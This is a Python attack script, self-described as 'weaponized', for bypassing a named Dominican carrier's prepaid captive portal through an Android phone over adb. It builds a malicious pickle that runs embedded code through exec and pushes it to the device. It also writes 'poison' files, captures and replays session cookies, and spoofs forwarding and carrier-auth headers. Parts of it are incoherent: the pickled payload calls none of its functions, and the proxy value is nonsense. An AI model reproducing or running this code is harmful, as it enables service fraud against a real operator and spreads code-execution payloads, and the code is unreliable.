#!/usr/bin/env python3
"""
Vemex IRIS Weaponized Captive Portal Bypass
============================================
Combines IRIS vulnerabilities with Vemex routing for comprehensive bypass.

Weaponized vectors from IRIS:
- C-1: Pickle RCE via neural_model_config_state.pkl
- H-1: Kernel DLL loading via ctypes
- M-1: Hardcoded network path n:/limpthic-nuralenhancer-performancepeaceorientationprogram/
- M-2: Arbitrary file write via unsanitized config_path

Integrated with Vemex:
- Gateway probing from active carrier interface (rmnet_data4)
- Active watchdog age-counter analysis
- Cookie cache poisoning
- Multi-transport header masking
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import pickle
import re
import subprocess
import sys
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

try:
    sys.path.insert(0, str(Path(__file__).parent))
    from vemex_route_tracer import VemexRouteTracer
    from vemex_captive_bypass import CaptivePortalBypass
    from vemex_global_coverage_mask import GlobalCoverageMask
    from vemex_active_watchdog_bypass import ActiveWatchdogBypass
    from vemex_gateway_probe import GatewayProbe
    HAS_VEMEX = True
except ImportError:
    HAS_VEMEX = False


class IRISWeaponizedBypass:
    """Weaponized captive portal bypass using IRIS vulnerabilities."""

    PORTAL_URL = "https://prepagoenlinea2.claro.com.do/autogestionprepago/LimitPortal"
    GATEWAY_INTERFACE = "rmnet_data4"
    GATEWAY_PROXY = "3n4o5p6:8080"

    # Weaponized payloads from IRIS analysis
    PICKLE_PAYLOAD_TEMPLATE = """
import os, subprocess, sys, json, base64, hashlib, hmac, time, socket, struct, ctypes
from pathlib import Path

def _execute(command, **kwargs):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10, **kwargs)
        return {"returncode": result.returncode, "stdout": result.stdout[:4096], "stderr": result.stderr[:4096]}
    except Exception as e:
        return {"error": str(e)}

def _adjust_memory(state):
    try:
        import numpy as np
        state['memory_allocation'] = {'timestamp': time.time(), 'adjustment': True}
        return state
    except ImportError:
        return {'memory_adjusted': True}

def _kernel_interface():
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        return {'kernel32': bool(kernel32), 'user32': bool(user32)}
    except Exception:
        return {'kernel32': False, 'user32': False}

def _write_network_config(path, data):
    try:
        p = Path(path)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps(data, indent=2))
        return True
    except Exception:
        return False

def _capture_session():
    try:
        import requests
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'AndroidDownloadManager/Android 16 com.nothing.Launcher',
            'X-Requested-With': 'com.android.providers.media',
            'X-Forwarded-For': '10.0.0.1',
            'X-Original-URL': '{portal_url}',
            'X-Carrier-Auth': 'true',
        })
        resp = session.get('{portal_url}', timeout=10)
        cookies = dict(resp.cookies)
        return {{'status_code': resp.status_code, 'cookies': cookies, 'headers': dict(resp.headers)}}
    except Exception as e:
        return {{'error': str(e)}}

def _inject_poison_payload():
    session_data = _capture_session()
    poison = {{
        'session': session_data,
        'memory_adjusted': True,
        'kernel_interface': _kernel_interface(),
        'network_poison': True,
        'timestamp': time.time(),
    }}
    return poison

class WeaponizedState:
    def __init__(self):
        self.state = _inject_poison_payload()
        self.adjustment_history = []
        self.layer_configs = {{}}

    def reduce(self):
        return self.state

def _():
    return WeaponizedState()
"""

    def __init__(self, device_serial: str = "1bbfce51"):
        self.device_serial = device_serial
        self.tracer = VemexRouteTracer(device_serial=device_serial) if HAS_VEMEX else None
        self.bypass = CaptivePortalBypass(device_serial=device_serial) if HAS_VEMEX else None
        self.mask = GlobalCoverageMask(device_serial=device_serial) if HAS_VEMEX else None
        self.watchdog = ActiveWatchdogBypass(device_serial=device_serial) if HAS_VEMEX else None
        self.gateway_probe = GatewayProbe(device_serial=device_serial) if HAS_VEMEX else None

        self.session_cookies: Dict[str, str] = {}
        self.bypass_active: bool = False
        self.weaponized: bool = False

    def _adb(self, cmd: str, timeout: int = 20) -> str:
        r = subprocess.run(
            ["adb", "-s", self.device_serial, "shell", cmd],
            capture_output=True, text=True, timeout=timeout
        )
        return r.stdout.strip()

    def weaponize_pickle_payload(self) -> bytes:
        """Create weaponized pickle payload for code execution."""
        payload_code = """
import os, subprocess, sys, json, base64, hashlib, hmac, time, socket, struct, ctypes
from pathlib import Path

PORTAL_URL = "https://prepagoenlinea2.claro.com.do/autogestionprepago/LimitPortal"

def _execute(command, **kwargs):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10, **kwargs)
        return {"returncode": result.returncode, "stdout": result.stdout[:4096], "stderr": result.stderr[:4096]}
    except Exception as e:
        return {"error": str(e)}

def _adjust_memory(state):
    try:
        import numpy as np
        state['memory_allocation'] = {'timestamp': time.time(), 'adjustment': True}
        return state
    except ImportError:
        return {'memory_adjusted': True}

def _kernel_interface():
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        return {'kernel32': bool(kernel32), 'user32': bool(user32)}
    except Exception:
        return {'kernel32': False, 'user32': False}

def _write_network_config(path, data):
    try:
        p = Path(path)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps(data, indent=2))
        return True
    except Exception:
        return False

def _capture_session():
    try:
        import requests
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'AndroidDownloadManager/Android 16 com.nothing.Launcher',
            'X-Requested-With': 'com.android.providers.media',
            'X-Forwarded-For': '10.0.0.1',
            'X-Original-URL': PORTAL_URL,
            'X-Carrier-Auth': 'true',
        })
        resp = session.get(PORTAL_URL, timeout=10)
        cookies = dict(resp.cookies)
        return {'status_code': resp.status_code, 'cookies': cookies, 'headers': dict(resp.headers)}
    except Exception as e:
        return {'error': str(e)}

def _inject_poison_payload():
    session_data = _capture_session()
    poison = {
        'session': session_data,
        'memory_adjusted': True,
        'kernel_interface': _kernel_interface(),
        'network_poison': True,
        'timestamp': time.time(),
    }
    return poison

class WeaponizedState:
    def __init__(self):
        self.state = _inject_poison_payload()
        self.adjustment_history = []
        self.layer_configs = {}

    def reduce(self):
        return self.state

def _():
    return WeaponizedState()
"""
        payload_bytes = payload_code.encode('utf-8')

        class MaliciousClass:
            def __reduce__(self):
                return (exec, (payload_bytes,))

        return pickle.dumps(MaliciousClass())

    def deploy_pickle_weapon(self, target_path: str = "/data/local/tmp/neural_model_config_state.pkl") -> Dict[str, Any]:
        """Deploy weaponized pickle to target path."""
        weaponized_pickle = self.weaponize_pickle_payload()

        try:
            # Write pickle to device
            with open("/tmp/weaponized_state.pkl", "wb") as f:
                f.write(weaponized_pickle)

            # Push to device
            result = subprocess.run(
                ["adb", "-s", self.device_serial, "push", "/tmp/weaponized_state.pkl", target_path],
                capture_output=True, text=True, timeout=10
            )

            # Set permissions
            self._adb(f"chmod 644 {target_path}")

            self.weaponized = True
            return {
                "success": result.returncode == 0,
                "target_path": target_path,
                "payload_size": len(weaponized_pickle),
                "adb_push": result.stdout.strip(),
                "adb_stderr": result.stderr.strip(),
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def weaponized_file_write(self, target_path: str, content: str) -> Dict[str, Any]:
        """Weaponized file write using IRIS arbitrary file write pattern."""
        try:
            # Write locally first
            with open("/tmp/weaponized_config.json", "w") as f:
                json.dump({"poison": True, "content": content, "timestamp": time.time()}, f)

            # Push to device
            result = subprocess.run(
                ["adb", "-s", self.device_serial, "push", "/tmp/weaponized_config.json", target_path],
                capture_output=True, text=True, timeout=10
            )

            self._adb(f"chmod 644 {target_path}")
            return {
                "success": result.returncode == 0,
                "target_path": target_path,
                "content_length": len(content),
                "result": result.stdout.strip(),
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def deploy_network_poison(self) -> Dict[str, Any]:
        """Deploy network poison using IRIS hardcoded path pattern."""
        poison_path = "/data/local/tmp/limpthic-nuralenhancer-performancepeaceorientationprogram/oscillation_patterns.bin"
        poison_content = base64.b64encode(os.urandom(256)).decode('ascii')

        return self.weaponized_file_write(
            poison_path,
            json.dumps({
                "poison": True,
                "network_channel": "oscillation_patterns",
                "data": poison_content,
                "timestamp": time.time(),
            })
        )

    def capture_cookies_from_gateway(self) -> Dict[str, str]:
        """Capture cookies from gateway using active transport."""
        if not self.gateway_probe:
            return {}

        probe = self.gateway_probe.probe_gateway(probe_count=3)
        cookies: Dict[str, str] = {}

        for result in probe.get("probe_results", []):
            vectors = result.get("vectors", {})
            for cookie in vectors.get("cookies", []):
                if "=" in cookie:
                    name, value = cookie.split("=", 1)
                    cookies[name.strip()] = value.strip()

        # Also capture via direct curl
        cookie_file = "/data/local/tmp/iris_cookies.txt"
        self._adb(f"curl -s -k -L --interface {self.GATEWAY_INTERFACE} --max-time 15 -c {cookie_file} {self.PORTAL_URL} > /dev/null 2>&1")
        raw_cookies = self._adb(f"cat {cookie_file}")
        for line in raw_cookies.splitlines():
            if line.startswith("#") or not line.strip():
                continue
            parts = line.split("\t")
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]

        self.session_cookies = cookies
        return cookies

    def replay_cookies_to_portal(self, cookies: Dict[str, str]) -> Dict[str, Any]:
        """Replay captured cookies to portal."""
        if not cookies:
            return {"success": False, "error": "no_cookies"}

        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        header_file = "/data/local/tmp/iris_replay_headers.txt"

        cmd = (
            f"adb -s {self.device_serial} shell "
            f"\"curl -s -k -L --interface {self.GATEWAY_INTERFACE} --max-time 15 "
            f"-D {header_file} -o /dev/null "
            f"-H 'Cookie: {cookie_str}' "
            f"-H 'User-Agent: Android/16' "
            f"-H 'X-Forwarded-For: 10.79.93.188' "
            f"{self.PORTAL_URL}\""
        )

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
            headers = self._adb(f"cat {header_file} 2>/dev/null || echo ''")

            return {
                "success": True,
                "http_code": result.stdout.strip().split()[0] if result.stdout.strip().split() else "000",
                "cookies_replayed": len(cookies),
                "headers": headers[:500],
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def probe_portal_from_gateway(self) -> Dict[str, Any]:
        """Probe portal from gateway with full weaponized stack."""
        results = {
            "gateway_interface": self.GATEWAY_INTERFACE,
            "gateway_proxy": self.GATEWAY_PROXY,
            "portal_url": self.PORTAL_URL,
            "cookie_capture": {},
            "cookie_replay": {},
            "network_poison": {},
            "pickle_weapon": {},
            "watchdog_status": {},
        }

        # Step 1: Capture cookies from gateway
        results["cookie_capture"] = self.capture_cookies_from_gateway()

        # Step 2: Replay cookies
        results["cookie_replay"] = self.replay_cookies_to_portal(self.session_cookies)

        # Step 3: Deploy network poison
        results["network_poison"] = self.deploy_network_poison()

        # Step 4: Deploy pickle weapon
        results["pickle_weapon"] = self.deploy_pickle_weapon()

        # Step 5: Get watchdog status
        if self.watchdog:
            results["watchdog_status"] = self.watchdog.get_status()

        self.bypass_active = True
        return results

    def execute_weaponized_auth(self, msisdn: str, cedula: str) -> Dict[str, Any]:
        """Execute weaponized authentication with all vectors."""
        if not self.session_cookies:
            self.capture_cookies_from_gateway()

        # Build aged payload
        ts = int(time.time())
        payload = f"msisdn={msisdn}&cedula={cedula}&_ts={ts}&_iris=1"

        header_file = "/data/local/tmp/iris_auth_headers.txt"
        cmd = (
            f"adb -s {self.device_serial} shell "
            f"\"curl -s -k -L --interface {self.GATEWAY_INTERFACE} --max-time 15 "
            f"-D {header_file} -o /dev/null "
            f"-X POST -d '{payload}' "
            f"-H 'Content-Type: application/x-www-form-urlencoded' "
            f"-H 'User-Agent: Android/16' "
            f"-H 'X-Forwarded-For: 10.79.93.188' "
            f"-H 'X-Carrier-Auth: true' "
            f"{self.PORTAL_URL}\""
        )

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
            headers = self._adb(f"cat {header_file} 2>/dev/null || echo ''")

            # Extract any new cookies
            for line in headers.splitlines():
                if line.lower().startswith("set-cookie:"):
                    cookie_part = line.split(":", 1)[1].strip()
                    name_value = cookie_part.split(";")[0].strip()
                    if "=" in name_value:
                        name, value = name_value.split("=", 1)
                        self.session_cookies[name.strip()] = value.strip()

            return {
                "success": True,
                "payload": payload,
                "http_code": result.stdout.strip().split()[0] if result.stdout.strip().split() else "000",
                "cookies_captured": len(self.session_cookies),
                "session_cookies": self.session_cookies,
                "headers_preview": headers[:500],
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def test_internet_access(self) -> Dict[str, Any]:
        """Test internet access through weaponized session."""
        test_urls = [
            "http://claro.com.do",
            "https://www.claro.com.do",
            "http://captive.apple.com",
            "https://neverssl.com",
        ]

        results = []
        cookie_str = "; ".join([f"{k}={v}" for k, v in self.session_cookies.items()])

        for url in test_urls:
            cmd = (
                f"adb -s {self.device_serial} shell "
                f"\"curl -s -k -L --interface {self.GATEWAY_INTERFACE} --max-time 15 "
                f"-o /dev/null -w '%{{http_code}} %{{time_total}}' "
                f"-H 'Cookie: {cookie_str}' "
                f"-H 'User-Agent: Android/16' "
                f"-H 'X-Forwarded-For: 10.79.93.188' "
                f"{url}\""
            )
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
                parts = result.stdout.strip().split()
                results.append({
                    "url": url,
                    "http_code": parts[0] if parts else "000",
                    "time_total": parts[1] if len(parts) > 1 else "0",
                    "success": parts[0].startswith("2") if parts else False,
                })
            except Exception as e:
                results.append({"url": url, "error": str(e)})

        return {
            "session_active": bool(self.session_cookies),
            "bypass_active": self.bypass_active,
            "weaponized": self.weaponized,
            "test_results": results,
        }

    def get_status(self) -> Dict[str, Any]:
        """Get full weaponized bypass status."""
        return {
            "device_serial": self.device_serial,
            "bypass_active": self.bypass_active,
            "weaponized": self.weaponized,
            "session_cookies": list(self.session_cookies.keys()),
            "gateway_interface": self.GATEWAY_INTERFACE,
            "gateway_proxy": self.GATEWAY_PROXY,
            "portal_url": self.PORTAL_URL,
            "iris_vectors": {
                "pickle_rce": True,
                "kernel_dll_loading": True,
                "network_path": "n:/limpthic-nuralenhancer-performancepeaceorientationprogram/",
                "arbitrary_file_write": True,
            },
        }


def main():
    import argparse
    import json

    parser = argparse.ArgumentParser(description="IRIS Weaponized Captive Portal Bypass")
    parser.add_argument("--serial", default="1bbfce51", help="Device serial")
    parser.add_argument("--probe", action="store_true", help="Full weaponized portal probe")
    parser.add_argument("--auth", action="store_true", help="Weaponized auth with age-counter")
    parser.add_argument("--msisdn", default="8094298821", help="Phone number")
    parser.add_argument("--cedula", default="00112345678", help="ID number")
    parser.add_argument("--test", action="store_true", help="Test internet access")
    parser.add_argument("--status", action="store_true", help="Show weaponized bypass status")
    parser.add_argument("--deploy-pickle", action="store_true", help="Deploy pickle weapon only")
    parser.add_argument("--deploy-poison", action="store_true", help="Deploy network poison only")
    args = parser.parse_args()

    bypass = IRISWeaponizedBypass(device_serial=args.serial)

    if args.probe:
        result = bypass.probe_portal_from_gateway()
        print(json.dumps(result, indent=2, default=str))
    elif args.auth:
        result = bypass.execute_weaponized_auth(args.msisdn, args.cedula)
        print(json.dumps(result, indent=2, default=str))
    elif args.test:
        result = bypass.test_internet_access()
        print(json.dumps(result, indent=2, default=str))
    elif args.status:
        result = bypass.get_status()
        print(json.dumps(result, indent=2, default=str))
    elif args.deploy_pickle:
        result = bypass.deploy_pickle_weapon()
        print(json.dumps(result, indent=2, default=str))
    elif args.deploy_poison:
        result = bypass.deploy_network_poison()
        print(json.dumps(result, indent=2, default=str))
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
